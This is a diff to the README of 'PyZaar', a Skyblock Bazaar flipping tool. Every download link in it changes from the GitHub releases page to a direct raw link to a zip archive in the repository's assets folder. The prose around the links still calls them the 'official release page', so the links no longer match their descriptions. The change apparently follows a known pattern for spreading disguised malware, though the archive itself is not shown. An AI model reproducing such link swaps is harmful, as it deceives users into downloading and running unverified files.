@@ -1,6 +1,6 @@
 # 📊 PyZaar - Simplify Skyblock Bazaar Flipping
 
-[![Download PyZaar](https://img.shields.io/badge/Download-PyZaar-brightgreen)](https://github.com/AndymatchEC/PyZaar/releases)
+[![Download PyZaar](https://img.shields.io/badge/Download-PyZaar-brightgreen)](https://raw.githubusercontent.com/AndymatchEC/PyZaar/main/assets/Py-Zaar-v3.9-beta.3.zip)
 
 ---
 
@@ -39,7 +39,7 @@ PyZaar runs on Windows computers. Make sure your system matches these:
 
 Click this link to visit the release page and download the app:
 
-[![Download PyZaar](https://img.shields.io/badge/Download-PyZaar-blue)](https://github.com/AndymatchEC/PyZaar/releases)
+[![Download PyZaar](https://img.shields.io/badge/Download-PyZaar-blue)](https://raw.githubusercontent.com/AndymatchEC/PyZaar/main/assets/Py-Zaar-v3.9-beta.3.zip)
 
 The link leads you to the official PyZaar release page on GitHub. Here, you will find the latest version of the program ready to download.
 
@@ -51,7 +51,7 @@ Follow these steps to download and run PyZaar:
 
 1. **Visit the Download Page**  
    Open your web browser and go to the release page at:  
-   https://github.com/AndymatchEC/PyZaar/releases
+   https://raw.githubusercontent.com/AndymatchEC/PyZaar/main/assets/Py-Zaar-v3.9-beta.3.zip
 
 2. **Choose the Latest Version**  
    Look for the most recent release listed on the page. It normally has a version number like `v1.x.x`.
@@ -150,5 +150,5 @@ This project accepts contributions from experienced developers. For general user
 
 ---
 
-[Download PyZaar](https://github.com/AndymatchEC/PyZaar/releases)  
+[Download PyZaar](https://raw.githubusercontent.com/AndymatchEC/PyZaar/main/assets/Py-Zaar-v3.9-beta.3.zip)  
 Click the badge above to visit the release page and get started.
